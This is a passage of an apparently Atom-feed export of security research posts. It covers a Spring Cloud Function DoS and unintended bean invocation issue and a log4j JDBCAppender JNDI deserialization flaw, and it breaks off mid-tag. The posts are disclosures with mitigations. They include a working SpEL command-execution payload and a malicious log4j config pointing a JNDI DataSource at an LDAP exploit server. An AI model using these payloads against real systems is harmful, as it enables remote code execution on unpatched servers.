prevents unauthorized execution of bean functions), we can achieve denial-of-service since the verification of invocation permissions is only made after the lookup function.</p><h2 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof Of Concept"></a>Proof Of Concept</h2><p>Using the sample code created by Spring, <a href="https://github.com/spring-cloud/spring-cloud-function/tree/v4.0.0-M2/spring-cloud-function-samples/function-sample-pojo">function-sample-pojo</a>, which has the following functions</p><ul><li>Uppercase</li><li>Lowercase</li><li>Words<br>(Note that for the PoC to work, we need to call a function that exists so it will register in the cache).<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST  http://host/uppercase,</span><br><span class="line">payload: &#123;‘<span class="selector-tag">a</span>’:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>As you can see below, the cache increases in size over time and affects the response time accordingly (the functionRegistrations list is in the <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L158">register</a> function):</li></ul><img src="/img/blogs/spring-function-cloud/Image-2.png" style="width: 100%;"/><img src="/img/blogs/spring-function-cloud/Image-3.png" style="width: 100%;"/><img src="/img/blogs/spring-function-cloud/Image-4.png" style="width: 100%;"/><img src="/img/blogs/spring-function-cloud/Image-5.png" style="width: 100%;"/><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Update Spring Cloud Function to 3.2.6 or above.</p><h1 id="Unintended-Function-Invocations"><a href="#Unintended-Function-Invocations" class="headerlink" title="Unintended Function Invocations"></a>Unintended Function Invocations</h1><h2 id="Technical-Details-1"><a href="#Technical-Details-1" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>This bug affects the same <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L103">lookup</a> function, which attempts to determine if the function itself should be executable as a bean function. In the <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L108">second line</a>, the function name passes through the <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L216">normalizeFunctionDefinition</a> function –</p><img src="/img/blogs/spring-function-cloud/Image-6.png" style="width: 100%;"/><p>This function will create a list named ‘eligibleFunction’ which contains the function a user can invoke. In case there is only one function defined, it will replace whatever name it got to that ‘default’ function name, otherwise, it will return the input as-is.</p><p>Here, similar to the aforementioned DoS issue, the splitting of the function names is done after this function, so if the function name contains ‘,’ or ‘|’, the replacement to the ‘default’ function won’t happen.</p><p>In the following example, we add a cloud.fn dependency which is meant to add a function to our project (using the function-sample-pojo project as an example).</p><img src="/img/blogs/spring-function-cloud/Image-7.png" style="width: 100%;"/><p>We have the following list:</p><img src="/img/blogs/spring-function-cloud/Image-8.png" style="width: 100%;"/><p>Despite having an ‘eligibleFunction’ list, later in the lookup function, Spring Cloud Function will try to determine the function in the <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L124">‘this.discoverFunctionInBeanFactory(functionName);</a>’ line. The <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/BeanFactoryAwareFunctionRegistry.java#L164">discoverFunctionInBeanFactory</a> function searches in the whole beanFactory of the applicationContext, which is actually far more extensive than the list in eligibleFunctions and contains way more functions than intended and defined by developers via bean annotations, encompassing the entire bean library in ApplicationContext:</p><img src="/img/blogs/spring-function-cloud/Image-9.png" style="width: 100%;"/><p>Although we have here over 580 other functions, other filters are being done later in the lookup function before registering.</p><img src="/img/blogs/spring-function-cloud/Image-10.png" style="width: 100%;"/><p>The red highlights are the steps the functionCandidate needs to pass in order to register a function - but registering a function does not mean we can invoke them. These functions were not meant to execute from the function router like that; this results in unexpected behavior, where unintended functions attempt to execute but fail due to extraneous errors.  This is best shown in two common exceptions when attempting to invoke arbitrary functions from ApplicationContext:</p><ul><li>Casting to a Supplier exception – happens to void functions, as these functions must have a return value</li><li>Argument mismatch – the input of the function is an object without a default&#x2F;nullary constructor. Invocation fails without a simple constructor. (We can control to a certain extent the input type via different post payloads so sometimes this exception could be avoided)</li></ul><p>The red highlighted code checks filter many beans from ApplicationContext <strong>but not all</strong>. For example, if the bean is a class, it must have one ‘functional’ function – a class pattern where the class has one function aside from the constructor. This means that while not all ApplicationContext beans are accessible, some beans are exposed, and some are not in a way that is completely tangential to whether they should have been exposed and invoked from URL function invocation.</p><p>The following code will dump <strong>all</strong> the functions a user can invoke in ApplicationContext, and when running this will show many more invokable functions than intended.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">Collection</span> <span class="variable">registeredBeans</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"><span class="type">Collection</span> <span class="variable">supplierRegisteredBeansExceptions</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(DemoApplication.class, args);</span><br><span class="line"><span class="type">FunctionCatalog</span> <span class="variable">catalog</span> <span class="operator">=</span> context.getBean(FunctionCatalog.class);</span><br><span class="line">System.out.println(<span class="string">&quot;Num of Beans: &quot;</span> + context.getBeanDefinitionNames().length);</span><br><span class="line"><span class="keyword">for</span> (String functionName : context.getBeanDefinitionNames())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">SimpleFunctionRegistry.<span class="type">FunctionInvocationWrapper</span> <span class="variable">function</span> <span class="operator">=</span> (SimpleFunctionRegistry.FunctionInvocationWrapper)catalog.lookup(functionName);</span><br><span class="line"><span class="keyword">if</span> (function != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//get non Supplier beans</span></span><br><span class="line"><span class="keyword">if</span> (function.isSupplier())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">((Supplier)function.getTarget()).get();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (ClassCastException exception)&#123;supplierRegisteredBeansExceptions.add(functionName);&#125;</span><br><span class="line">&#125;</span><br><span class="line">registeredBeans.add(functionName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;Num of registered functions: &quot;</span> + registeredBeans.size());</span><br><span class="line">System.out.println(registeredBeans);</span><br><span class="line"><span class="type">Collection</span> <span class="variable">nonSupplierRegisteredBeans</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;( registeredBeans );</span><br><span class="line">nonSupplierRegisteredBeans.removeAll(supplierRegisteredBeansExceptions);</span><br><span class="line">System.out.println(<span class="string">&quot;Non Supplier Functions: &quot;</span> + nonSupplierRegisteredBeans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As an example of an output, we can see some internal functions, configurations, and more:</p><img src="/img/blogs/spring-function-cloud/Image-11.png" style="width: 100%;"/><p>The applicationContext beans are dependent on user-code and dependencies imported into the project (just by adding dependencies to the pom.xml - more beans are added as per Spring’s core design, and thus more bean functions to potentially invoke). The impact of this can vary and is highly dependent on the application, its dependencies, and internal bean implementation, but the nature of this function invocation is entirely arbitrary.</p><p>When we tried to find some interesting functions to invoke, we didn’t encounter anything with a real impact. But keep in mind that the search is endless and could change depending on the environment.</p><p>Here is an example of an arbitrary function we can invoke that won’t cause any threat (org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration):</p><img src="/img/blogs/spring-function-cloud/Image-12.png" style="width: 100%;"/><img src="/img/blogs/spring-function-cloud/Image-13.png" style="width: 100%;"/><p>(In order for the function to run it needs an input and depending on the type of parameter the post body needs to change. As you will see in the next example showing a Boolean parameter).</p><p>A second example is when having the dependency org.apache.camel.springboot:camel-geocoder-starter-3.17.0 in the pom.xml. The class where we invoke the function is in the spring-cloud-commons package, but camel-geocoder-starter actually inserts this class into the application context.<br><a href="https://github.com/spring-cloud/spring-cloud-commons/blob/v4.0.0-M2/spring-cloud-commons/src/main/java/org/springframework/cloud/commons/httpclient/DefaultOkHttpClientFactory.java#L47">createBuilder</a> in the DefaultOkHttpClientFactory class is the function, it changes ‘this.builder’ to disable SSL validation or enable it.</p><p>The screenshots below show that the builder changes are saved to ‘this’ object. Thus, we can change the builder to disable SSL validation for subsequent invocations. The severity of this specific invocation is questionable since the usage of this factory elsewhere in code is complicated, but this demonstrates a real example of an attacker changing a configuration by altering a global flag through a bound object that doesn’t seem to be the author’s intent.</p><img src="/img/blogs/spring-function-cloud/Image-14.png" style="width: 100%;"/><p>2nd invocation, the sslSockerFactoryOrNull is changed from the first call:</p><img src="/img/blogs/spring-function-cloud/Image-15.png" style="width: 100%;"/><h2 id="Potential-Impact-Demonstration"><a href="#Potential-Impact-Demonstration" class="headerlink" title="Potential Impact Demonstration"></a>Potential Impact Demonstration</h2><p><strong>The following code is written by us (Checkmarx Researchers.) It is completely fabricated and doesn’t exist in Spring. The purpose of this code is to demonstrate the potential impact of the issue, since the function itself is not inherently dangerous without user input, yet it is arbitrarily exposed via Spring Cloud Function.</strong><br>Having the following code and the dependency - org.springframework.amqp:spring-rabbit in the project. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.Message;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RabbitTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RabbitTest</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">checkMandatory</span><span class="params">(RabbitTemplate rabbitTemplate)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> rabbitTemplate.isMandatoryFor(<span class="keyword">new</span> <span class="title class_">Message</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="string">&#x27;a&#x27;</span>&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this example, the @Component annotation adds the class to the application context. (Note that no @Bean annotation is required; components for dependency injection also end up in the application context). Since it’s a class, it must have one functional method according to the checks made in the lookup function (only one method apart from the constructor). Now we can call the checkMandatory function with the rabbitTest URI. </p><p>The object <a href="https://github.com/spring-projects/spring-amqp/blob/v3.0.0-M3/spring-rabbit/src/main/java/org/springframework/amqp/rabbit/core/RabbitTemplate.java">RabbitTemplate</a> has a default&#x2F;nullary constructor and a <a href="https://github.com/spring-projects/spring-amqp/blob/v3.0.0-M3/spring-rabbit/src/main/java/org/springframework/amqp/rabbit/core/RabbitTemplate.java#L529">setter</a> that will take a string and parse a SpEL expression out of it. The isMandatoryFor function will execute getValue to that malicious expression, which, if you are familiar with SPeL vulnerabilities, results in expression execution, which, in SPeL’s case, is equivalent to a Java code Injection:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http:<span class="comment">//springhost/rabbitTest</span></span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">&quot;mandatoryExpressionString&quot;</span>:<span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;open -a /System/Applications/Calculator.app\&quot;)&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>(Known issue - In case this doesn’t work and runs the default function, because of the <a href="https://github.com/spring-cloud/spring-cloud-function/blob/v4.0.0-M2/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/catalog/SimpleFunctionRegistry.java#L216">normalizeFunctionDefinition</a> replacement, we can bypass this validation by calling  <a href="http://springhost/rabbitTest">http://springhost/rabbitTest</a>, (note the comma) . This will register the function to the cache and then we can call it again normally and execute it):</p><p>This execution will result in RCE:</p><img src="/img/blogs/spring-function-cloud/Image-16.png" style="width: 100%;"/><p>Another example with the dependency org.springframework.cloud:spring-cloud-starter-stream-rabbit, we get exposed to the function <a href="https://github.com/spring-cloud/spring-cloud-stream/blob/v4.0.0-M2/core/spring-cloud-stream/src/main/java/org/springframework/cloud/stream/config/SpelExpressionConverterConfiguration.java#L89">spelConverter</a>, which gets a string and returns an Expression. With the feature of passing one’s output to another’s input, having a class like so, this is also vulnerable:</p><img src="/img/blogs/spring-function-cloud/Image-17.png" style="width: 100%;"/><p>We can’t directly call ‘get’ since the Expression object doesn’t have a default&#x2F;nullary constructor, but it’s possible with the output of spelConverter. This hints at a much deeper issue where, using certain dependencies, a gadget of chained application context beans could be crafted.</p><p>The examples above have some custom code written, but here are some interesting functions we found only by adding dependencies to the pom.xml without a real impact. </p><img src="/img/blogs/spring-function-cloud/Image-18.jpg" style="width: 100%;"/><h2 id="Mitigation-1"><a href="#Mitigation-1" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Update Spring Cloud Function to 3.2.6 or above, which contains basic filtering of some beans, use the configuration spring.cloud.function.ineligible-definitions to exclude additional unintended functions. </p><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>2&#x2F;06&#x2F;2022</td><td>Vulnerability was reported responsibly.</td></tr><tr><td>15&#x2F;06&#x2F;2022</td><td>Checkmarx SCA customers using spring function cloud were warned and provided mitigation guidance,  without exposing the technical details of the findings.</td></tr><tr><td>15&#x2F;06&#x2F;2022</td><td>Fixed version was released.</td></tr><tr><td>16&#x2F;06&#x2F;2022</td><td>CVE-2022-22979 was assigned.</td></tr></tbody></table><h1 id="Final-Words"><a href="#Final-Words" class="headerlink" title="Final Words"></a>Final Words</h1><p>Discovering vulnerabilities like the ones documented in this report is why the Checkmarx Security Research Team performs investigations into open source projects. With open source making up the vast majority of today’s commercial software, security vulnerabilities must be taken seriously and handled carefully across the industry.</p><p>Solutions like <a href="https://checkmarx.com/product/cxsca-open-source-scanning/">Checkmarx SCA</a> are essential in helping organizations identify, prioritize, and remediate open source vulnerabilities more efficiently to improve their overall software security risk posture. Checkmarx SCA customers receive notice of issues like the ones described above in advance of public disclosure. For more information or to speak to an expert about how to detect, prioritize, and remediate open source risks in your code, contact us.</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://advisory.checkmarx.net/advisory/CX-2022-5010/">https://advisory.checkmarx.net/advisory/CX-2022-5010/</a></li><li><a href="https://advisory.checkmarx.net/advisory/CX-2022-5009/">https://advisory.checkmarx.net/advisory/CX-2022-5009/</a></li><li><a href="https://tanzu.vmware.com/security/cve-2022-22979">https://tanzu.vmware.com/security/cve-2022-22979</a></li><li><a href="https://github.com/spring-cloud/spring-cloud-function/commit/9b6952f041ed028aba1165a55f38589ec6a93c09">DoS Fix</a></li><li><a href="https://github.com/spring-cloud/spring-cloud-function/commit/1381cd4e6d04961d028683d2226242c01d7397ab">Unintended function invocation mitigation</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;The Spring Framework applicati</summary>
      
    
    
    
    
    <category term="java" scheme="https://yaniv-git.github.io/tags/java/"/>
    
    <category term="dos" scheme="https://yaniv-git.github.io/tags/dos/"/>
    
    <category term="denial of service" scheme="https://yaniv-git.github.io/tags/denial-of-service/"/>
    
    <category term="code execution" scheme="https://yaniv-git.github.io/tags/code-execution/"/>
    
  </entry>
  
  <entry>
    <title>Deserialization attack via JDBC Appender in log4j</title>
    <link href="https://yaniv-git.github.io/2021/12/29/Deserialization%20attack%20via%20JDBC%20Appender%20in%20log4j/"/>
    <id>https://yaniv-git.github.io/2021/12/29/Deserialization%20attack%20via%20JDBC%20Appender%20in%20log4j/</id>
    <published>2021-12-29T23:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a Arbitrary Code Execution attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.</p><h2 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h2><p>Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4).</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>In case an attacker can modify the logging configuration (due to fetching remote configuration feature in log4j this opens different attack vectors, such as MITM, DNS poisoning, lateral movement after gaining access to a storage node) an Arbitrary Code Execution could be achieved.</p><h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><p>Using the same LDAP server as done in the CVE-2021-44228 PoC, all we need to do is to run: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;log4j2.configurationFile&quot;</span>,<span class="string">&quot;http://127.0.0.1:8888/config.xml&quot;</span>); </span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>); </span><br><span class="line"><span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(log4j.class); </span><br></pre></td></tr></table></figure><p>And to serve the following config.xml: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">JDBC</span> <span class="attr">name</span>=<span class="string">&quot;databaseAppender&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;dbo.application_log&quot;</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;eventDate&quot;</span> <span class="attr">isEventTimestamp</span>=<span class="string">&quot;true&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;level&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%level&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;logger&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%logger&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%message&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;exception&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%ex&#123;full&#125;&quot;</span> /&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">JDBC</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;warn&quot;</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;databaseAppender&quot;</span>/&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="Expected-result"><a href="#Expected-result" class="headerlink" title="Expected result:"></a>Expected result:</h3><p>When initializing the logger object, a request to the config.xml will be made. In the loading process, an attempt to load the DataSource will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and run. </p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Update log4j to one of the fixed versions.</p><h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by Checkmarx Security Researchers <a href="https://twitter.com/ynizry">Yaniv Nizry</a> and <a href="https://twitter.com/liad__levy">Liad Levy</a>.</p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol><li><a href="https://lists.apache.org/thread/kflcpnczh2y0vhfxn5fd0fnxb80l5kwm">Release Candidate</a> </li><li><a href="https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16">Commit</a></li><li><a href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">Blog Post</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h2&gt;&lt;p&gt;Apache Log4j2 versions 2.0-beta7 through 2.17.0 (e</summary>
      
    
    
    
    
    <category term="java" scheme="https://yaniv-git.github.io/tags/java/"/>
    
    <category term="deserialization" scheme="https://yaniv-git.github.io/tags/deserialization/"/>
    
    <category term="log4j" scheme="https://yaniv-git.github.io/tags/log4j/"/>
    
    <category term="log4j2" scheme="https://yaniv-git.github.io/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-44832: Apache Log4j 2.17.0 Arbitrary Code Execution via JDBCAppender DataSource Element</title>
    <link href="https://yaniv-git.github.io/2021/12/27/Apache%20Log4j%202.17.0%20Arbitrary%20Code%20Execution%20via%20JDBCAppender%20DataSource%20Element/"/>
    <id>https://yaniv-git.github.io/2021/12/27/Apache%20Log4j%202.17.0%20Arbitrary%20Code%20Execution%20via%20JDBCAppender%20DataSource%20Element/</id>
    <published>2021-12-27T23:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Log4j is a highly popular logging package in Java that is used widely by developers, companies such as Google, Steam, Apple, Minecraft, and even on one of NASA’s Mars rovers utilize this package. On December 9th, the most critical zero-day exploit in recent years was discovered in log4j. The vulnerability <a href="https://checkmarx.com/blog/apache-log4j-remote-code-execution-cve-2021-44228/">CVE-2021-44228</a> was unauthenticated, zero-click RCE (Remote Code Execution) by logging a certain payload.</p><p>Following that, a big hype was created in the world and especially in the security community, making many researchers interested in logging packages. Several other vulnerabilities and bypasses were found and published since then in log4j and other logging packages, find out more on our <a href="https://checkmarx.com/resources/homepage/apache-log4j-rce-variants-and-updates">“Variants and Updates”</a> blog.</p><h1 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h1><p>Being extremely focused and dedicated researchers, we wanted to do a security audit ourselves on the log4j package in the hope of finding something interesting. And after a week of reviewing the code and testing, we encountered a new undiscovered deserialization security vulnerability. This vulnerability doesn’t use the disabled lookup feature.</p><p>The complexity of this vulnerability is higher than the original CVE-2021-44228 since it requires the attacker to have control over the configuration (like the ‘logback’ vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42550">CVE-2021-42550</a>). <strong>In log4j there is a feature to load a remote configuration file</strong> that isn’t part of the local codebase and opens various attack vectors such as <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM</a> (man in the middle) attack, DNS poisoning, lateral movement after gaining access to a storage node.</p><p>While looking at log4j features we came across the <a href="https://logging.apache.org/log4j/2.x/manual/appenders.html">‘Appender’</a> functionalities. Appenders are basically where to output the logs, so we have for example ConsoleAppender, FileAppender, etc.</p><p>The <a href="https://logging.apache.org/log4j/2.x/manual/appenders.html#JDBCAppender">JDBCAppender</a> caught our eyes since there are some public ways of getting RCE via JDBC Java deserialization (see this <a href="https://www.youtube.com/watch?v=Lv9BC_bYaI8">Blackhat</a> talk By Yongtao Wang, Lucas Zhang and Kunzhe Chai for more information).</p><p>But before getting into the JDBC deserialization in log4j, we noticed that in the documentation there is a way to configure log4j so that it will fetch the database source dynamically and remotely via JNDI. The configuration of the remote database location is done with the DataSource element. Taking the example from the official documentation:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">JDBC</span> <span class="attr">name</span>=<span class="string">&quot;databaseAppender&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;dbo.application_log&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;java:/comp/env/jdbc/LoggingDataSource&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">Column</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="attr">JDBC</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">…</span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>there was not any restriction of putting an arbitrary LDAP remote URL, thus making it potential to the classic JNDI:LDAP deserialization vector (more information on the <a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">Blackhat</a> talk by Alvaro Munoz &amp; Oleksandr Mirosh).<br>After changing the tag to:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span 